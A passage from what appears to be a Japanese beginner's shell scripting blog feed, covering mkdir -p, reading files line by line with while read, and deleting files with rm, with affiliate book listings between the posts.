&lt;p>作成対象ディレクトリの親ディレクトリが存在しない場合 はすべての親ディレクトリを作成する&lt;/p>
&lt;/dd>
&lt;dd>作成対象ディレクトリがすでに存在している場合 は何も行わず、エラーもはかない&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:mkdir_example2.sh" data-lang="bash:mkdir_example2.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="c1"># 一旦ディレクトリを作成&lt;/span>
mkdir -p /tmp/work
ls -l -d /tmp/work/
&lt;span class="c1"># 出力&lt;/span>
&lt;span class="c1"># drwxr-xr-x 2 root root 64 Aug 22 08:26 /tmp/work/&lt;/span>
&lt;span class="c1"># オプション無しですでに存在しているディレクトリを作成&lt;/span>
mkdir /tmp/work
&lt;span class="c1"># 出力&lt;/span>
&lt;span class="c1"># mkdir: /tmp/work: File exists&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$?&lt;/span>
&lt;span class="c1"># 1&lt;/span>
&lt;span class="c1"># -pオプション有りだとエラーを吐かない&lt;/span>
mkdir -p /tmp/work
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$?&lt;/span>
&lt;span class="c1"># 0&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash mkdir_example2.sh
drwxr-xr-x 2 suzukiiichiro wheel 64 1 21 13:13 /tmp/work/
mkdir: /tmp/work: File exists
1
0
$
&lt;/code>&lt;/pre>&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【２３．ファイルを読む】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-23-suzuki/</link><pubDate>Thu, 13 Jan 2022 11:26:13 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-23-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-23-suzuki/shellscript.jpg" alt="Featured image of post 【２３．ファイルを読む】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="ファイルを読む">ファイルを読む&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>ファイルを読む：&lt;/b>&lt;/font>&lt;br>
whileループでreadコマンドを使用すると、bashで任意のファイルを1行ずつ読み取ることができます。&amp;lsquo;read_file.sh&amp;rsquo;という名前のファイルを作成し、次のコードを追加してください。 別途作成する&amp;rsquo;book.txt&amp;rsquo;の内容を読み取ります。&lt;/p>
&lt;p>「book.txt」ファイルを作成します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ vim book.txt
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-:book.txt" data-lang=":book.txt">ファイルを読む：
ループを使用すると、bashで任意のファイルを1行ずつ読み取ることができます。
&amp;#39;read_file.sh&amp;#39;という名前のファイルを作成し、次のコードを追加して、&amp;#39;book.txt&amp;#39;という名前の既存のファイルを読み取ります。
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:read_file.sh" data-lang="bash:read_file.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">file&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;book.txt&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -f &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$file&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
&lt;span class="k">while&lt;/span> &lt;span class="nb">read&lt;/span> line&lt;span class="p">;&lt;/span>&lt;span class="k">do&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$line&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">done&lt;/span>&amp;lt;&lt;span class="nv">$file&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$file&lt;/span>&lt;span class="s2"> ファイルがありません&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash read_file.sh
ファイルを読む：
ループを使用すると、bashで任意のファイルを1行ずつ読み取ることができます。
'read_file.sh'という名前のファイルを作成し、次のコードを追加して、'book.txt'という名前の既存のファイルを読み取ります。
&lt;/code>&lt;/pre>&lt;p>具体的に以下のファイルを作成してファイルを読み込み、必要な部分を抜き出して表示してみます。&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash:instance-tag.list" data-lang="bash:instance-tag.list">i-0f6126b7aeedfabd6,hoge
i-050536efdd9dc1126,fuga
i-0869f24358fb3f698,f8k
&lt;/code>&lt;/pre>&lt;p>cat します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat instance-tag.list
i-0f6126b7aeedfabd6,hoge
i-050536efdd9dc1126,fuga
i-0869f24358fb3f698,f8k
$
&lt;/code>&lt;/pre>&lt;p>以下のソースファイルを作成します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:whileread_example2.sh" data-lang="bash:whileread_example2.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="c1"># catしてwhile read で1行ずつ読み込む&lt;/span>
&lt;span class="c1"># 「cat instance-tag.list」の結果を1行ずつ「line」&lt;/span>
&lt;span class="c1"># という変数に代入しています。&lt;/span>
cat instance-tag.list &lt;span class="p">|&lt;/span> &lt;span class="k">while&lt;/span> &lt;span class="nb">read&lt;/span> line&lt;span class="p">;&lt;/span>&lt;span class="k">do&lt;/span>
&lt;span class="c1"># 二つの変数に値切り出して代入&lt;/span>
&lt;span class="c1"># $()は()内で指定したコマンドの実行結果を返します。 &lt;/span>
&lt;span class="c1"># 今回の場合、「echo $line | cut -d, -f 1」の実行結果が&lt;/span>
&lt;span class="c1"># 「instance_id」に定義されます。&lt;/span>
&lt;span class="nv">instance_id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$(&lt;/span>&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$line&lt;/span> &lt;span class="p">|&lt;/span> cut -d, -f 1&lt;span class="k">)&lt;/span>
&lt;span class="nv">tag_value&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$(&lt;/span>&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$line&lt;/span> &lt;span class="p">|&lt;/span> cut -d, -f 2&lt;span class="k">)&lt;/span>
&lt;span class="c1"># 表示&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;instance_id: &lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">instance_id&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;tag_value: &lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">tag_value&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash whileread_example2.sh
instance_id: i-0f6126b7aeedfabd6
tag_value: hoge
instance_id: i-050536efdd9dc1126
tag_value: fuga
instance_id: i-0869f24358fb3f698
tag_value: f8k
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>cutコマンドの部分は、awkコマンドを使うこともあります。&lt;/dd>
&lt;dd>今回は、cutの方が処理速度が速いため、cutコマンドを使いました。&lt;/dd>
&lt;dd>
&lt;p>ちなみにawkの場合は、以下のように記述します。&lt;/p>
&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;pre tabindex="0">&lt;code>instance_id=$(echo $line | awk -F, '{print $1;}');
tag_value=$(echo $line | awk -F, '{print $2;}');
&lt;/code>&lt;/pre>&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【２４．ファイルを削除する】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-24-suzuki/</link><pubDate>Thu, 13 Jan 2022 11:26:13 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-24-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-24-suzuki/shellscript.jpg" alt="Featured image of post 【２４．ファイルを削除する】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="ファイルを削除する">ファイルを削除する&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>ファイルを削除します：&lt;/b>&lt;/font>&lt;br>
&amp;lsquo;rm&amp;rsquo;コマンドは、ファイルまたはディレクトリを削除するためのコマンドです。次のコードを使用して「delete_file.sh」という名前のファイルを作成し、ユーザーからファイル名を取得して削除します。ここで、「-i」オプションは、ファイルを削除する前にユーザーに削除確認をに使用されます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:delete_file.sh" data-lang="bash:delete_file.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;削除するファイルまたはディレクトリ名を入力して下さい。&amp;#34;&lt;/span>
&lt;span class="nb">read&lt;/span> fn
rm -i &lt;span class="nv">$fn&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ls
suzuki/ book.txt
bash delete_file.sh
削除するファイルまたはディレクトリ名を入力して下さい。
suzuki
rm: suzuki: is a directory
bash delete_file.sh
削除するファイルまたはディレクトリ名を入力して下さい。
book.txt
$ ls
suzuki/
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>基本的に、ファイルもディレクトリも削除するコマンドは同じです。ディレクトリには再帰的に（フォルダの階層も含めて）削除するオプション(-r リカーション)があります。&lt;/dd>
&lt;dd>
&lt;p>rm&lt;/p>
&lt;/dd>
&lt;dd>-f :確認をせずに削除&lt;/dd>
&lt;dd>-r ：再帰的に削除&lt;/dd>
&lt;dd>
&lt;p>フォルダを削除&lt;/p>
&lt;/dd>
&lt;dd>rm -rf &lt;target directory>&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>高度なヒント&lt;/dt>
&lt;dd>シェルスクリプトで自動化処理を作成する場合、cp や rm で、確認をせずに実行したいことが多々あります。&lt;/dd>
&lt;dd>この場合は、&lt;/dd>
&lt;dd>
&lt;p>/bin/cp&lt;/p>
&lt;/dd>
&lt;dd>
&lt;p>または&lt;/p>
&lt;/dd>
&lt;dd>/bin/rm&lt;/dd>
&lt;dd>
&lt;p>を使うと、確認なしで実行することができます。&lt;/p>
&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
